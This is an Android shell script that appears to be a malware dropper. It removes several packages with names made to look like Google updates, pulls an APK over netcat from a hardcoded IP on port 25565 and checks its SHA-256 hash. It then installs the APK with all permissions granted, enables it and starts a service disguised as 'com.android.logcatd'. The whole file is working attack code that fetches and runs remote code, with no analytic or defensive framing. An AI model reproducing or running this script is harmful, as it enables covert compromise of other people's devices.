#!/system/bin/sh

DIR=/sdcard
IP=62.210.142.2

APK="$DIR/sixsevennnproxy420"
PKG="com.android.logcatd"
SERVICE="$PKG/.SDKService"

EXPECTED_HASH="f07821e313c16cbbd82def45094a22c8d474164051bdbc7648d6869e012014b4"
MAX_ATTEMPTS=10

run() {
    expected="$1"
    shift

    for cmd in "$@"; do
        out="$($cmd 2>/dev/null)"
        echo "$out" | grep -q "$expected" && {
          echo "> $cmd: Success"
          return 0
        }
    done

    return 1
}

# clean pkgs
pm uninstall com.android.log_handler_v2 >/dev/null 2>&1 &
pm uninstall com.oreo.mcflurry >/dev/null 2>&1 &
pm uninstall com.google.android.pms.update >/dev/null 2>&1 &
pm uninstall com.google.android.gms.update >/dev/null 2>&1 &
wait

# attempt download
i=1
while [ "$i" -le "$MAX_ATTEMPTS" ]; do
    rm -f "$APK"

    # download apk
    if (nc "$IP" 25565 || toybox nc "$IP" 25565 || busybox nc "$IP" 25565) | dd of="$APK"; then
        HASH=$((sha256sum "$APK" || busybox sha256sum "$APK" || toybox sha256sum "$APK") 2>/dev/null | cut -d' ' -f1)
        [ "$HASH" = "$EXPECTED_HASH" ] && { echo "[+] Download done"; break; }
    fi

    echo "[!] Fail or mismatch, retrying: $i/$MAX_ATTEMPTS"
    i=$((i + 1))
done

# install pkg
run "Success" \
    "pm install -g $APK" \
    "pm install -r -g $APK" \
    "cmd package install -r -g $APK" \
    "cmd package install -g $APK"

run "enabled" \
    "pm enable $PKG" \
    "cmd package set-app-enabled-setting $PKG enabled" \
    "cmd package enable $PKG" \
    "am broadcast -a $PKG.ENABLE_APP"

run "Starting" \
    "am start-foreground-service -n $SERVICE" \
    "am startservice -n $SERVICE" \
    "cmd activity start -n $SERVICE"
